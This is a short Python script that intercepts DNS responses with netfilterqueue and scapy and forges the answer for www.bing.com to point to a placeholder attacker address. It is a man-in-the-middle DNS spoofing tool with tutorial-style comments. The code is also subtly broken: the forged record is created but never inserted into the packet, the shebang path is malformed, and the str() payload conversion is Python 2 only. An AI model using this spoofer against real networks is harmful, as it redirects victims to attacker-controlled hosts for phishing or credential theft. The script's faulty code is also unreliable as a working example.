#!/usr/bin/env/ python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    # the scapy_packet variable is created by converting the packet payload into a Scapy packet object using scapy.IP(packet.get_payload()). This allows us to manipulate and inspect the packet using Scapy's functionalities
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # Checking if "www.bing.com" is present in the qname variable
        if "www.bing.com" in qname:
            # If the condition is true, print a message indicating spoofing of the target
            print("[+] Spoofing Target")

            # Creating a DNS response packet with the specified rrname and rdata
            answer = scapy.DNSRR(rrname=qname, rdata="attacker_ip")

            # Modifying the DNS answer count in the scapy_packet object to 1
            scapy_packet[scapy.DNS].ancount = 1

            # Deleting the length and checksum fields from the IP header in the scapy_packet object
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum

            # Deleting the checksum and length fields from the UDP header in the scapy_packet object
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # Setting the payload of the packet to the modified scapy_packet object
            packet.set_payload(str(scapy_packet))

    packet.accept()


# defining the process_packet function, an instance of netfilterqueue.NetfilterQueue is created and assigned to the queue variable.
queue = netfilterqueue.NetfilterQueue()

# The bind method is called on the queue object to bind it to a specific queue number (0 in this case) and specify the function to be called (process_packet) for each intercepted packet
queue.bind(0, process_packet)

# the run method is called on the queue object to start the packet interception and processing loop
queue.run()
